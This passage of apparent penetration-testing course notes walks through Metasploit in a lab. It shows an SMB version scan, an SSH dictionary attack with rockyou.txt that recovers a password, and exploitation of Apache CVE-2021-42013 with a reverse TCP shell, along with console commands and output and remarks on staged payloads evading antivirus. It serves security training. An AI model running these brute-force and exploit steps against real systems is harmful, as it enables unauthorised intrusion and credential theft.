+   30  auxiliary/admin/smb/psexec_ntdsgrab                                              normal  No     PsExec NTDS.dit And SYSTEM Hive Download Utility
+   31  auxiliary/scanner/sap/sap_smb_relay                                              normal  No     SAP SMB Relay Abuse
+   32  auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal  No     SAP SOAP EPS_DELETE_FILE File Deletion
+   33  auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal  No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
+   34  auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal  No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
+   35  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal  No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
+   36  auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                    normal  No     SMB Create Pipe Request Corruption
+   37  auxiliary/fuzzers/smb/smb_create_pipe                                            normal  No     SMB Create Pipe Request Fuzzer
+   38  auxiliary/admin/smb/list_directory                                               normal  No     SMB Directory Listing Utility
+   39  auxiliary/scanner/smb/smb_enumusers_domain                                       normal  No     SMB Domain User Enumeration
+   40  auxiliary/admin/smb/delete_file                                                  normal  No     SMB File Delete Utility
+   41  auxiliary/admin/smb/download_file                                                normal  No     SMB File Download Utility
+   42  auxiliary/admin/smb/upload_file                                                  normal  No     SMB File Upload Utility
+   43  auxiliary/scanner/smb/smb_enum_gpp                                               normal  No     SMB Group Policy Preference Saved Passwords Enumeration
+   44  auxiliary/scanner/smb/smb_login                                                  normal  No     SMB Login Check Scanner
+   45  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                    normal  No     SMB NTLMv1 Login Request Corruption
+   46  auxiliary/fuzzers/smb/smb_negotiate_corrupt                                      normal  No     SMB Negotiate Dialect Corruption
+   47  auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                     normal  No     SMB Negotiate SMB2 Dialect Corruption
+   48  auxiliary/scanner/smb/smb_lookupsid                                              normal  No     SMB SID User Enumeration (LookupSid)
+   49  auxiliary/admin/smb/check_dir_file                                               normal  No     SMB Scanner Check File/Directory Utility
+   50  auxiliary/scanner/smb/pipe_auditor                                               normal  No     SMB Session Pipe Auditor
+   51  auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal  No     SMB Session Pipe DCERPC Auditor
+   52  auxiliary/scanner/smb/smb_enumshares                                             normal  No     SMB Share Enumeration
+   53  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal  No     SMB Tree Connect Request Corruption
+   54  auxiliary/fuzzers/smb/smb_tree_connect                                           normal  No     SMB Tree Connect Request Fuzzer
+   55  auxiliary/scanner/smb/smb_enumusers                                              normal  No     SMB User Enumeration (SAM EnumUsers)
+   56  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection
+   57  auxiliary/dos/smb/smb_loris                                     2017-06-29       normal  No     SMBLoris NBSS Denial of Service
+   58  auxiliary/scanner/snmp/snmp_enumshares                                           normal  No     SNMP Windows SMB Share Enumeration
+   59  auxiliary/admin/smb/samba_symlink_traversal                                      normal  No     Samba Symlink Directory Traversal
+   60  auxiliary/scanner/smb/smb_uninit_cred                                            normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   61  auxiliary/dos/samba/read_nttrans_ea_list                                         normal  No     Samba read_nttrans_ea_list Integer Overflow
+   62  auxiliary/server/teamviewer_uri_smb_redirect                                     normal  No     TeamViewer Unquoted URI Handler SMB Redirect
+   63  auxiliary/scanner/smb/impacket/wmiexec                          2018-03-19       normal  No     WMI Exec
+   64  auxiliary/admin/smb/webexec_command                                              normal  No     WebEx Remote Command Execution Utility
+   65  auxiliary/fileformat/multidrop                                                   normal  No     Windows SMB Multi Dropper</p>
+<p>Interact with a module by name or index. For example info 65, use 65 or use auxiliary/fileformat/multidrop</p>
+<pre><code>- This shows us all SMB aux modules the search has identified.
+
+To activate a mod we enter `use` followed by the mod name or using the index provided from the search result.  Using the later, activate the mod `auxiliary/scanner/smb/smb_version` with index `56`.
+</code></pre>
+<p>msf6 &gt; use 56
+msf6 auxiliary(scanner/smb/smb_version) &gt;</p>
+<pre><code>- The command prompt indicates the active module.
+
+To get info about the current active mod we can enter `info`.
+</code></pre>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; info</p>
+<pre><code>   Name: SMB Version Detection
+ Module: auxiliary/scanner/smb/smb_version
+License: Metasploit Framework License (BSD)
+   Rank: Normal
+</code></pre>
+<p>Provided by:
+  hdm <a href="mailto:x@hdm.io">x@hdm.io</a>
+  Spencer McIntyre
+  Christophe De La Fuente</p>
+<p>Check supported:
+  No</p>
+<p>Basic options:
+  Name     Current Setting  Required  Description</p>
+<hr>
+<p>  RHOSTS                    yes       The target host(s), see <a href="https://docs.metasploit.c">https://docs.metasploit.c</a>
+                                      om/docs/using-metasploit/basics/using-metasploit.
+                                      html
+  THREADS  1                yes       The number of concurrent threads (max one per hos
+                                      t)</p>
+<p>Description:
+  Fingerprint and display version information about SMB servers. Protocol
+  information and host operating system (if available) will be reported.
+  Host operating system detection requires the remote server to support
+  version 1 of the SMB protocol. Compression and encryption capability
+  negotiation is only present in version 3.1.1.</p>
+<p>View the full module info with the info -d command.</p>
+<pre><code>- The description provides info about the purpose of the module.
+
+The output shows the Basic options and args of the mod.  We can also display options of a mod by entering `show options`.  The options contain a column named `Required`, which specifies if a value needs to be set before launching a mod.  Most Metasploit mods will set some of the options for us.
+</code></pre>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; show options</p>
+<p>Module options (auxiliary/scanner/smb/smb_version):</p>
+<p>   Name     Current Setting  Required  Description</p>
+<hr>
+<p>   RHOSTS                    yes       The target host(s), see <a href="https://docs.metasploit">https://docs.metasploit</a>.
+                                       com/docs/using-metasploit/basics/using-metasploi
+                                       t.html
+   THREADS  1                yes       The number of concurrent threads (max one per ho
+                                       st)</p>
+<p>View the full module info with the info, or info -d command.</p>
+<pre><code>- Shows the option RHOSTS has no value set but is required by the module.
+ - *To display all required, but not yet set, options we can use the command show missing.*.
+
+We can add or remove values from options with `set` and `unset`.  We will `set` the value of RHOSTS to the IP of BRUTE2.
+</code></pre>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.197.202
+RHOSTS =&gt; 192.168.197.202</p>
+<pre><code>
+Instead of setting the value manually we can set RHOSTS automatically with DB results.  We can set RHOSTS to all discovered hosts with open port 445 by entering `services`, the port number as `-p` arg, and `--rhosts` to set the results for this option.  First we `unset` the manually set value.
+</code></pre>
+<h1>msf6 auxiliary(scanner/smb/smb_version) &gt; unset RHOSTS
+Unsetting RHOSTS...
+msf6 auxiliary(scanner/smb/smb_version) &gt; services -p 445 --rhosts
+Services</h1>
+<p>host             port  proto  name          state  info</p>
+<hr>
+<p>192.168.197.202  445   tcp    microsoft-ds  open</p>
+<p>RHOSTS =&gt; 192.168.197.202</p>
+<pre><code>- Metasploit set the value for RHOSTS using DB results.
+
+With required options set, we can launch the mod by entering `run`.
+</code></pre>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; run</p>
+<p>[<em>] 192.168.197.202:445   - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{ce3451ca-39b8-4812-a0d9-3e1ab8c7c379}) (authentication domain:BRUTE2)
+[</em>] 192.168.197.202:      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</p>
+<pre><code>- The output shows that the target system supports version 2/3 of SMB and prefers SMB 3.1.1.
+
+Next, we use the `vulns` command to show if Metasploit detected any vulnerabilites based on the results of this module.
+</code></pre>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; vulns</p>
+<h1>Vulnerabilities</h1>
+<p>Timestamp             Host             Name                     References</p>
+<hr>
+<p>2023-11-20 00:12:27   192.168.197.202  SMB Signing Is Not Requ  URL-<a href="https://support.mic">https://support.mic</a>
+UTC                                    ired                     rosoft.com/en-us/help/1
+                                                                61372/how-to-enable-smb
+                                                                -signing-in-windows-nt,
+                                                                URL-<a href="https://support.mic">https://support.mic</a>
+                                                                rosoft.com/en-us/help/8
+                                                                87429/overview-of-serve
+                                                                r-message-block-signing</p>
+<pre><code>- Our DB contains one vuln entry for [SMB Signing is not required](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing)
+ - This is a great way to quickly identify vulns without the use of a vulnerability scanner.
+
+Let&#39;s use another module.  In the Password Attacks Module, we succesfully identified the credentials on BRUTE with a dict attack agains SSH.  We can use Metasploit, instead of Hydra, to perform this attack.  First we `search` for SSH aux mods.
+</code></pre>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; search type:auxiliary ssh</p>
+<h1>Matching Modules</h1>
+<h1>Name                                                  Disclosure Date  Rank    Check  Description</h1>
+<hr>
+<p>   0   auxiliary/scanner/ssh/apache_karaf_command_execution  2016-02-09       normal  No     Apache Karaf Default Credentials Command Execution
+   1   auxiliary/scanner/ssh/karaf_login                                      normal  No     Apache Karaf Login Utility
+   2   auxiliary/scanner/ssh/cerberus_sftp_enumusers         2014-05-27       normal  No     Cerberus FTP Server SFTP Username Enumeration
+   3   auxiliary/dos/cisco/cisco_7937g_dos                   2020-06-02       normal  No     Cisco 7937G Denial-of-Service Attack
+   4   auxiliary/admin/http/cisco_7937g_ssh_privesc          2020-06-02       normal  No     Cisco 7937G SSH Privilege Escalation
+   5   auxiliary/scanner/http/cisco_firepower_login                           normal  No     Cisco Firepower Management Console 6.0 Login
+   6   auxiliary/scanner/ssh/eaton_xpert_backdoor            2018-07-18       normal  No     Eaton Xpert Meter SSH Private Key Exposure Scanner
+   7   auxiliary/scanner/ssh/fortinet_backdoor               2016-01-09       normal  No     Fortinet SSH Backdoor Scanner
+   8   auxiliary/scanner/http/gitlab_user_enum               2014-11-21       normal  No     GitLab User Enumeration
+   9   auxiliary/scanner/ssh/juniper_backdoor                2015-12-20       normal  No     Juniper SSH Backdoor Scanner
+   10  auxiliary/scanner/ssh/detect_kippo                                     normal  No     Kippo SSH Honeypot Detector
+   11  auxiliary/gather/qnap_lfi                             2019-11-25       normal  Yes    QNAP QTS and Photo Station Local File Inclusion
+   12  auxiliary/fuzzers/ssh/ssh_version_15                                   normal  No     SSH 1.5 Version Fuzzer
+   13  auxiliary/fuzzers/ssh/ssh_version_2                                    normal  No     SSH 2.0 Version Fuzzer
+   14  auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                              normal  No     SSH Key Exchange Init Corruption
+   15  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner
+   16  auxiliary/scanner/ssh/ssh_identify_pubkeys                             normal  No     SSH Public Key Acceptance Scanner
+   17  auxiliary/scanner/ssh/ssh_login_pubkey                                 normal  No     SSH Public Key Login Scanner
+   18  auxiliary/scanner/ssh/ssh_enumusers                                    normal  No     SSH Username Enumeration
+   19  auxiliary/fuzzers/ssh/ssh_version_corrupt                              normal  No     SSH Version Corruption
+   20  auxiliary/scanner/ssh/ssh_version                                      normal  No     SSH Version Scanner
+   21  auxiliary/dos/windows/ssh/sysax_sshd_kexchange        2013-03-17       normal  No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
+   22  auxiliary/scanner/ssh/ssh_enum_git_keys                                normal  No     Test SSH Github Access
+   23  auxiliary/scanner/ssh/libssh_auth_bypass              2018-10-16       normal  No     libssh Authentication Bypass Scanner</p>
+<p>Interact with a module by name or index. For example info 23, use 23 or use auxiliary/scanner/ssh/libssh_auth_bypass</p>
+<pre><code>
+We will activate `auxiliary/scanner/ssh/ssh_login` using index `15` and display its options.
+</code></pre>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; use 15
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; show options</p>
+<p>Module options (auxiliary/scanner/ssh/ssh_login):</p>
+<p>   Name              Current Setting  Required  Description</p>
+<hr>
+<p>   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in
+                                                 the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current databa
+                                                se to the list
+   DB_ALL_USERS      false            no        Add all users in the current database t
+                                                o the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the
+                                                 current database (Accepted: none, user
+                                                , user&amp;realm)
+   PASSWORD                           no        A specific password to authenticate wit
+                                                h
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target host(s), see <a href="https://docs.me">https://docs.me</a>
+                                                tasploit.com/docs/using-metasploit/basi
+                                                cs/using-metasploit.html
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works f
+                                                or a host
+   THREADS           1                yes       The number of concurrent threads (max o
+                                                ne per host)
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords sep
+                                                arated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for al
+                                                l users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           false            yes       Whether to print output for all attempt
+                                                s</p>
+<p>View the full module info with the info, or info -d command.</p>
+<pre><code>- There are various options to set in this module.
+ - Metasploit already set several for us.
+ - Similar to Hydra, we can set a password and user or provide files containing users, passwords, or both.
+
+In the example Password Attacks, we assume we already identified user `george`, specify the `rockyou.txt` for options `PASS_FILE`. 
+- Set `RHOSTS` to `192.168.197.201`
+- Set `RPORT` to `2222`
+</code></pre>
+<p>msf6 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /usr/share/wordlists/rockyou.txt
+PASS_FILE =&gt; /usr/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME george
+USERNAME =&gt; george
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.197.201
+RHOSTS =&gt; 192.168.197.201
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set RPORT 2222
+RPORT =&gt; 2222</p>
+<pre><code>
+With the required options set we can launch the mod with `run`.
+</code></pre>
+<p>msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</p>
+<p>[<em>] 192.168.197.201:2222 - Starting bruteforce
+[+] 192.168.197.201:2222 - Success: &#39;george:chocolate&#39; &#39;uid=1000(george) gid=0(root) groups=0(root),27(sudo) Linux 9195ad6f4213 5.15.0-50-generic #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux &#39;
+[</em>] SSH session 1 opened (192.168.45.182:34005 -&gt; 192.168.197.201:2222) at 2023-11-19 16:39:30 -0800</p>
+<pre><code>- Metasploit performed the dict attack and determined the correct password.
+ - Unlike Hydra, it also opens a session.
+
+As with the `vulns` command, we can display all valid credentials with `creds`.
+</code></pre>
+<h1>msf6 auxiliary(scanner/ssh/ssh_login) &gt; creds
+Credentials</h1>
+<p>host             origin           service         public  private    realm  private_type  JtR Format</p>
+<hr>
+<p>192.168.197.201  192.168.197.201  2222/tcp (ssh)  george  chocolate         Password</p>
+<pre><code>
+Metasploit stores the valid creds in the DB, shows us the related host, the service, and the type of creds.
+
+
+##### Exploit Modules
+
+Exploit modules contain exploit code for applications and services with known vulns.  Metasploit contains over 2200 exploits (2023), each developed/tested, making MSF highly capable of exploiting a wide range of targets.  The exploits are invoked in a similar manner to auxiliary modules.
+
+In this example we will access the target system, WEB18, using one of the included exploit modules.  Assume we identified the target systems running Apache 2.4.49 web server, vulnerable to CVE-2021-42013.  We&#39;ll attempt to use MSF and its exploit modules to get code execution.
+
+Create a workspace for this section and search MSF for modules related to &quot;Apache 2.4.49&quot;.
+</code></pre>
+<p>msf6 auxiliary(scanner/ssh/ssh_login) &gt; workspace -a exploits
+[<em>] Added workspace: exploits
+[</em>] Workspace: exploits
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; workspace 
+  default
+  pen200</p>
+<ul>
+<li>exploits
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; search Apache 2.4.49</li>
+</ul>
+<h1>Matching Modules</h1>
+<h1>Name                                          Disclosure Date  Rank       Check  Description</h1>
+<hr>
+<p>   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
+   1  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner</p>
+<p>Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/apache_normalize_path</p>
+<pre><code>- Index `0` corresponding exploit.
+- Index `1` vuln scanner for corresponding exploit.
+
+Use the exploit and enter `info` to review its description.
+</code></pre>
+<p>msf6 auxiliary(scanner/ssh/ssh_login) &gt; use 0
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; info</p>
+<pre><code>   Name: Apache 2.4.49/2.4.50 Traversal RCE
+ Module: exploit/multi/http/apache_normalize_path_rce
+</code></pre>
+<p>   Platform: Unix, Linux
+       Arch: cmd, x64, x86
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-05-10</p>
+<p>Provided by:
+  Ash Daulton
+  Dhiraj Mishra
+  mekhalleh (RAMELLA Sébastien)</p>
+<p>Module side effects:
+ ioc-in-logs
+ artifacts-on-disk</p>
+<p>Module stability:
+ crash-safe</p>
+<p>Module reliability:
+ repeatable-session</p>
+<p>Available targets:
+      Id  Name
+      --  ----
+  =&gt;  0   Automatic (Dropper)
+      1   Unix Command (In-Memory)</p>
+<p>Check supported:
+  Yes</p>
+<p>Basic options:
+  Name       Current Setting  Required  Description</p>
+<hr>
+<p>  CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41
+                                        773, CVE-2021-42013)
+  DEPTH      5                yes       Depth for Path Traversal
+  Proxies                     no        A proxy chain of format type:host:port[,type:ho
+                                        st:port][...]
+  RHOSTS                      yes       The target host(s), see <a href="https://docs.metasploit">https://docs.metasploit</a>
+                                        .com/docs/using-metasploit/basics/using-metaspl
+                                        oit.html
+  RPORT      443              yes       The target port (TCP)
+  SSL        true             no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /cgi-bin         yes       Base path
+  VHOST                       no        HTTP server virtual host</p>
+<p>Payload information:</p>
+<p>Description:
+  This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
+  If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
+  it can be used to execute arbitrary commands (Remote Command Execution).
+  This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).</p>
+<p>References:
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773">https://nvd.nist.gov/vuln/detail/CVE-2021-41773</a>
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42013">https://nvd.nist.gov/vuln/detail/CVE-2021-42013</a>
+  <a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a>
+  <a href="https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse">https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse</a>
+  <a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml</a>
+  <a href="https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74">https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74</a>
+  <a href="https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis">https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis</a></p>
+<p>View the full module info with the info -d command.</p>
+<pre><code>- Output contains important info in the context of the exploit.
+ - Before using we should understand what the module is doing by reviewing this info.
+ - Output starts with general info.
+  - Name.
+  - Platform.
+  - Arch.
+ - Contains info about potential side effects.
+  - IoC entries in log solutions.
+  - Artifacts on disk.
+ - Module stability.
+  - If we might crash the target.
+ - What info defenders may obtain from our using this exploit.
+
+Module reliability determines if we can run the exploit more than once.  In our example the ouput states repeatable-session.  This is important because some exploit modules will only work once.
+
+The targets availble area of the output contains target specs of vulerabile targets by the exploit mod, ranging from diff OS, app versions, to command exec methods.  Most mods provide the Automatic target which tries to identify either by itself or by using the defaul op specified in the module.
+
+Descriptions provides us a text-based explanation of mod purpose, this mod appears to be correct mod for the vuln in this scenario.
+
+Now we understand what the exploit mod does and what its implications are, we can display its options.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show options</p>
+<p>Module options (exploit/multi/http/apache_normalize_path_rce):</p>
+<p>   Name       Current Setting  Required  Description</p>
+<hr>
+<p>   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
+                                         1773, CVE-2021-42013)
+   DEPTH      5                yes       Depth for Path Traversal
+   Proxies                     no        A proxy chain of format type:host:port[,type:h
+                                         ost:port][...]
+   RHOSTS                      yes       The target host(s), see <a href="https://docs.metasploi">https://docs.metasploi</a>
+                                         t.com/docs/using-metasploit/basics/using-metas
+                                         ploit.html
+   RPORT      443              yes       The target port (TCP)
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cgi-bin         yes       Base path
+   VHOST                       no        HTTP server virtual host</p>
+<p>Payload options (linux/x64/meterpreter/reverse_tcp):</p>
+<p>   Name   Current Setting  Required  Description</p>
+<hr>
+<p>   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port</p>
+<p>Exploit target:</p>
+<p>   Id  Name</p>
+<hr>
+<p>   0   Automatic (Dropper)</p>
+<pre><code>- Similar to aux mod options.
+ - Additional section `Payload options`
+  - If unset, default payload will be selected.
+   - Always better to explicitly set to maintain tight control of the exploit process.
+
+For now, we will set Payload to a regular TCP reverse shell.  We can select with `set payload` and the payload name, `payload/linux/x64/shell_reverse_tcp`.  We also enter the IP of our Kali machine as `LHOST`.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set payload payload/linux/x64/shell_reverse_tcp
+payload =&gt; linux/x64/shell_reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set LHOST 192.168.205.16
+LHOST =&gt; 192.168.205.16
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show options</p>
+<p>Module options (exploit/multi/http/apache_normalize_path_rce):</p>
+<p>   Name       Current Setting  Required  Description</p>
+<hr>
+<p>   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
+                                         1773, CVE-2021-42013)
+   DEPTH      5                yes       Depth for Path Traversal
+   Proxies                     no        A proxy chain of format type:host:port[,type:h
+                                         ost:port][...]
+   RHOSTS                      yes       The target host(s), see <a href="https://docs.metasploi">https://docs.metasploi</a>
+                                         t.com/docs/using-metasploit/basics/using-metas
+                                         ploit.html
+   RPORT      443              yes       The target port (TCP)
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cgi-bin         yes       Base path
+   VHOST                       no        HTTP server virtual host</p>
+<p>Payload options (linux/x64/shell_reverse_tcp):</p>
+<p>   Name   Current Setting  Required  Description</p>
+<hr>
+<p>   LHOST  192.168.45.182   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port</p>
+<p>Exploit target:</p>
+<p>   Id  Name</p>
+<hr>
+<p>   0   Automatic (Dropper)</p>
+<pre><code>- Entered payload now active.
+- LHOST set.
+- LPORT set default `4444`
+
+*In real penetration tests we may face the situation that port 4444 is blocked by firewalls or other security technologies. This is quite common as it is the default port for Metasploit&#39;s modules. In situations like this, changing the port number to ports associated with more commonly used protocols such as HTTP or HTTPS may lead to a successful execution of the selected payload.*
+
+Note that we don&#39;t need to start a manual listener with Netcat to catch the rev shell, Metasploit does this automatically for the selected payload.
+
+Now, let&#39;s set the options `SSL` to `false` and `RPORT` to `80`, then set `RHOSTS` to target IP and enter `run`.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set SSL false
+[!] Changing the SSL option&#39;s value may require changing RPORT!
+SSL =&gt; false
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set RPORT 80
+RPORT =&gt; 80
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set RHOSTS 192.168.205.16
+RHOSTS =&gt; 192.168.205.16
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; run</p>
+<p>[<em>] Started reverse TCP handler on 192.168.45.182:4444 
+[</em>] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] <a href="http://192.168.205.16:80">http://192.168.205.16:80</a> - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
+[<em>] Scanned 1 of 1 hosts (100% complete)
+[</em>] <a href="http://192.168.205.16:80">http://192.168.205.16:80</a> - Attempt to exploit for CVE-2021-42013
+[<em>] <a href="http://192.168.205.16:80">http://192.168.205.16:80</a> - Sending linux/x64/shell_reverse_tcp command payload
+[</em>] Command shell session 2 opened (192.168.45.182:4444 -&gt; 192.168.205.16:56688) at 2023-11-20 07:51:50 -0800
+[!] This exploit may require manual cleanup of &#39;/tmp/uHaCa&#39; on the target</p>
+<p>id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</p>
+<pre><code>- The exploit starts a listener on `4444`
+- Checks if target is vulnerable.
+- Vuln exploited and payload sent.
+- Console states session open and we have rce.
+
+Let&#39;s explore the concept of sessions and jobs in Metasploit.  Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.
+
+When we launched the exploit with `run`, a session was created and we obtained a shell.  We can background the session with `Ctrl+Z` and prompt confirmation.  Once sent to the background, we can use `sessions -l` to list all active sessions.
+</code></pre>
+<p>id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+^Z
+Background session 2? [y/N]  y
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -l</p>
+<h1>Active sessions</h1>
+<p>  Id  Name  Type             Information  Connection</p>
+<hr>
+<p>  2         shell x64/linux               192.168.45.182:4444 -&gt; 192.168.205.16:56688 (
+                                          192.168.205.16)</p>
+<pre><code>- Provides info about target and payload in use.
+ - Making it easy to identify which session manages access to which target.
+
+Interact with a session again by passing the session ID to `sessions -i`.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -i 2
+[*] Starting interaction with 2...</p>
+<p>uname -a
+Linux 5def8107a7b2 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</p>
+<pre><code>- We can enter commands into the interactive shell again.
+- Kill a session with `sessions -k` and the ID as arg.  .
+
+Instead of launching an exploit and sending the resulting session to the background, we can use `run -j` to launch it in the context of a job.  We&#39;ll still get the output of the mod, but need to interact with the session before we can access it.
+
+In an assessment, we face many targets, making it easy to lose track of machines we already have access to.  Using a framework like MSF helps us manage access to these systems.  Eliminating the need to search through terminals for the correct session.  Launch exploit modules with `run -j` to launch exploit modules in the background, MDF will create the session for us, while we are already working on the next target.
+
+MSF also stores info about targets, mod results, and vulns in the DB.  Valuable for furhter steps in the pentest and reporting to the client.
+
+#### 20.2 Using Metasploit Payloads
+
+- Understand the differences between staged and non-staged payloads.
+- Explore the Meterpreter payload.
+- Create executable payloads.
+
+##### Staged vs Non-Staged Payloads
+
+Let&#39;s explore the difference between stages and non-staged payloads.  Assume we have identified a buffer overflow vuln in a server.  As we learned, we must be aware of the buffer size our shellcode will be stored in.  If the shellcode size exceeds buffer, our exploit will fail, making payload type vital.
+
+The diff is subtle but important.  A non-staged payload is sent complete with the exploit, the payload contains the exploit and full shellcode for task.  Generally, these all-in-one payloads are more stable, but the size is larger than other types.
+
+Staged payloads are sent in two parts.  The first is a small primary payload that has the victim connect back to the attacker, transfering a larget secondary payload with the rest of the shellcode, finally executing it.
+
+There are several situations in which we would prefer to use a staged payload instead of non-staged.  A staged payload may be a better choice when there are space limitations in an exploit, they are typically smaller.  AV can detect shellcode in an exploit, by utilizing a first stage, which loads second stage shellcode, retrieving the shellcode and injecting into memory detection may be prevented, increasing out chances of success.
+
+With our basic understanding of the two payload types, we will use the same exploit mod as in the prior section and enter `show payloads`, getting a list of all compatible payloads.
+</code></pre>
+<h1>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads
+Compatible Payloads</h1>
+<h1>Name                                              Disclosure Date  Rank    Check  Description</h1>
+<hr>
+<p>...
+   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
+...
+   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
+...</p>
+<pre><code>- Shows the payload we used at index `20`
+- The `/` char is used to denote whether a payload is staged or not.
+ - `shell_reverse_tcp` at `20` is not staged.
+ - `shell/reverse_tcp` at `15` is staged.
+
+Use the staged payload for this exploit module and launch it, Metasploit will reuse the vals for the options form the previous payload.
+</code></pre>
+<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; db_nmap -A 192.168.250.16
+[<em>] Nmap: Starting Nmap 7.94 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2023-11-21 07:15 PST
+[</em>] Nmap: Nmap scan report for 192.168.250.16
+[<em>] Nmap: Host is up (0.076s latency).
+[</em>] Nmap: Not shown: 998 closed tcp ports (reset)
